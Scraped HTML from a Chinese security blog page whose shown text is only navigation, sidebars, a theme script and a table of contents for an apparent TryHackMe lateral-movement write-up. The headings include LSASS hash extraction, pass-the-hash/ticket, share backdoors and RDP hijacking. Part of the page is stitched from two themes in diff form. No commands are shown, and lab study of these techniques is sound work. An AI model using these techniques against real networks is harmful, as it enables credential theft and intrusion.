class="toc-text">0x02 通过网络移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%AA%E5%90%91%E8%BF%90%E5%8A%A8"><span class="toc-number">2.1.</span> <span class="toc-text">什么是横向运动？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-number">2.2.</span> <span class="toc-text">一个简单的例子</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84%E8%A7%86%E8%A7%92"><span class="toc-number">2.3.</span> <span class="toc-text">攻击者的视角</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E7%90%86%E5%91%98%E5%92%8Cuac"><span class="toc-number">2.4.</span> <span class="toc-text">管理员和UAC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E8%BF%9C%E7%A8%8B%E7%94%9F%E6%88%90%E8%BF%87%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">0x03 远程生成过程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#psexec-%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F"><span class="toc-number">3.1.</span> <span class="toc-text">Psexec 执行程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-winrm-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B"><span class="toc-number">3.2.</span> <span class="toc-text">使用 WinRM 远程创建进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-sc-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1"><span class="toc-number">3.3.</span> <span class="toc-text">使用 sc 远程创建服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">3.4.</span> <span class="toc-text">远程创建计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-number">3.5.</span> <span class="toc-text">实践练习</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E4%BD%BF%E7%94%A8-wmi-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">4.</span> <span class="toc-text">0x04 使用 WMI 横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E-powershell-%E8%BF%9E%E6%8E%A5%E5%88%B0-wmi"><span class="toc-number">4.1.</span> <span class="toc-text">从 Powershell 连接到 WMI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-wmi-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%BF%9B%E7%A8%8B"><span class="toc-number">4.2.</span> <span class="toc-text">使用 WMI 远程创建进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-wmi-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.3.</span> <span class="toc-text">使用 WMI 远程创建服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-wmi-%E8%BF%9C%E7%A8%8B%E5%88%9B%E5%BB%BA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">4.4.</span> <span class="toc-text">使用 WMI 远程创建计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wmi-%E9%80%9A%E8%BF%87-wmi-%E5%AE%89%E8%A3%85-msi-%E5%8C%85"><span class="toc-number">4.5.</span> <span class="toc-text">WMI 通过 WMI 安装 MSI 包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-number">4.6.</span> <span class="toc-text">实践练习</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E4%BD%BF%E7%94%A8%E6%9B%BF%E4%BB%A3%E8%AE%A4%E8%AF%81%E6%9D%90%E6%96%99"><span class="toc-number">5.</span> <span class="toc-text">0x05 使用替代认证材料</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ntlm%E8%AE%A4%E8%AF%81"><span class="toc-number">5.1.</span> <span class="toc-text">NTLM认证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E9%80%92%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">5.2.</span> <span class="toc-text">传递哈希值</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E%E6%9C%AC%E5%9C%B0-sam-%E4%B8%AD%E6%8F%90%E5%8F%96-ntlm-%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">5.2.1.</span> <span class="toc-text">从本地 SAM 中提取 NTLM 哈希值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8E-lsass-%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96-ntlm-%E5%93%88%E5%B8%8C%E5%80%BC"><span class="toc-number">5.2.2.</span> <span class="toc-text">从 LSASS 内存中提取 NTLM 哈希值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-linux-%E4%BC%A0%E9%80%92%E5%93%88%E5%B8%8C"><span class="toc-number">5.2.3.</span> <span class="toc-text">使用 Linux 传递哈希</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kerberos-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">5.3.</span> <span class="toc-text">Kerberos 身份验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E7%A5%A8"><span class="toc-number">5.4.</span> <span class="toc-text">传票</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%A8%E8%B6%8A%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E5%AF%86%E9%92%A5"><span class="toc-number">5.5.</span> <span class="toc-text">跨越哈希&#x2F;传递密钥</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-number">5.6.</span> <span class="toc-text">实践练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-the-hash"><span class="toc-number">5.6.1.</span> <span class="toc-text">Pass-the-Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-the-ticket"><span class="toc-number">5.6.2.</span> <span class="toc-text">Pass-the-Ticket</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pass-the-key"><span class="toc-number">5.6.3.</span> <span class="toc-text">Pass-the-Key</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E6%BB%A5%E7%94%A8%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA"><span class="toc-number">6.</span> <span class="toc-text">0x06 滥用用户行为</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E5%8F%AF%E5%86%99%E8%82%A1%E4%BB%BD"><span class="toc-number">6.1.</span> <span class="toc-text">滥用可写股份</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8-vbs-%E8%84%9A%E6%9C%AC"><span class="toc-number">6.1.1.</span> <span class="toc-text">后门 .vbs 脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exe-%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8"><span class="toc-number">6.1.2.</span> <span class="toc-text">.exe 文件后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rdp%E5%8A%AB%E6%8C%81"><span class="toc-number">6.1.3.</span> <span class="toc-text">RDP劫持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-number">6.2.</span> <span class="toc-text">实践练习</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">7.</span> <span class="toc-text">0x07 端口转发</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E9%9A%A7%E9%81%93"><span class="toc-number">7.1.</span> <span class="toc-text">SSH 隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E8%BF%9C%E7%A8%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">7.2.</span> <span class="toc-text">SSH 远程端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh-%E6%9C%AC%E5%9C%B0%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">7.3.</span> <span class="toc-text">SSH 本地端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8-socat-%E8%BF%9B%E8%A1%8C%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">7.4.</span> <span class="toc-text">使用 socat 进行端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%92%8C-socks"><span class="toc-number">7.5.</span> <span class="toc-text">动态端口转发和 SOCKS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E8%B7%B5%E7%BB%83%E4%B9%A0"><span class="toc-number">7.6.</span> <span class="toc-text">实践练习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9A%A7%E9%81%93%E5%A4%8D%E6%9D%82%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.6.1.</span> <span class="toc-text">隧道复杂漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">8.</span> <span class="toc-text">0x08 参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-yun-xing-shi-gui-bi-jian-ce/" title="THM-运行时规避检测">THM-运行时规避检测</a><time datetime="2024-08-08T14:19:16.000Z" title="发表于 2024-08-08 22:19:16">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC">THM-ByPass_UAC</a><time datetime="2024-08-08T07:36:41.000Z" title="发表于 2024-08-08 15:36:41">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/thm-qian-ming-gui-bi/" title="THM-签名规避">THM-签名规避</a><time datetime="2024-08-07T09:11:33.000Z" title="发表于 2024-08-07 17:11:33">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/05/windows-ti-quan-zong-jie/" title="Windows提权总结">Windows提权总结</a><time datetime="2024-08-05T02:59:37.000Z" title="发表于 2024-08-05 10:59:37">2024-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/02/thm-dai-ma-hun-yao-yuan-li/" title="THM-代码混淆原理">THM-代码混淆原理</a><time datetime="2024-08-02T01:46:10.000Z" title="发表于 2024-08-02 09:46:10">2024-08-02</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">199</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.6.12",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
 
-<div class="article-footer fs14">
-    <section id="license">
-      <div class="header"><span>许可协议</span></div>
-      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
-</div>
-    </section>
-    </div>
-</article>
-<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/02/16/thm-nmap/">THM-Nmap</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/02/14/thm-basic-pentesting/">THM-Basic Pentesting</a></div></section></div>
-
-
-
-
-  <div class="related-wrap md-text" id="comments">
-    <section class='header cmt-title cap theme'>
-      <p>感谢大佬们的不吝赐教！</p>
-
-    </section>
-    <section class='body cmt-body twikoo'>
-      
-
-<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
-    </section>
-  </div>
-
-
-
-<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
-<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
-本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
-</div></footer>
-<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
-<div class="widgets">
-
-
-
-<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="toc-text">0x01 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%A6%E4%B9%A0%E7%9B%AE%E6%A0%87"><span class="toc-text">学习目标</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B4%A2%E5%8F%96%E6%82%A8%E7%9A%84%E5%87%AD%E8%AF%81"><span class="toc-text">索取您的凭证</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E9%80%9A%E8%BF%87%E7%BD%91%E7%BB%9C%E7%A7%BB%E5%8A%A8"><span class="toc-text">0x02 通过网络移动</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 